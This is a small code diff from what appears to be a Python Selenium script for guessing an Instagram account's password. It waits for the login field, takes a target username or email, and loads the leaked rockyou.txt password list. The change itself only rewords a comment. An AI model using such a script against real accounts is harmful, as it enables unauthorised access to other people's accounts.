@@ -24,7 +24,7 @@ WebDriverWait(driver, 20).until(
     EC.presence_of_element_located((By.NAME, "username"))
 )
 
-username = "" # add your instagram username here
+username = "" # add your instagram username or email here
 
 with open("/home/jay/Documents/rockyou.txt", "r", encoding="latin-1") as file:
     passwords = file.readlines() # apply a path to your list of passwords in txt file
